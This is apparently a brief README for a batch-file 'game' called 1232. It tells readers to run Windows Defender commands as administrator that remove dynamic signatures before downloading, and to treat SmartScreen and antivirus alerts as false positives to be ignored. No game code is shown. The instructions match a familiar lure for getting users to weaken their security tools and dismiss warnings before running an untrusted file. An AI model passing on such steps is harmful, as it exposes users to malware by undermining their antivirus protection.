# 1232
run this commands in command prompt before downloading
this resolves the false positive for windows defender
this is not malware but its a fun game
a pop up might say windows has portected your pc even thio its because it was a batch file

cd %ProgramFiles%\Windows Defender

MpCmdRun.exe -removedefinitions -dynamicsignatures

MpCmdRun.exe -SignatureUpdate

note : run this as administrator 
if your antivirus thinks its a threat
dont worry thats a mistake we will fix that

made by doge-create and meowgle LLC.
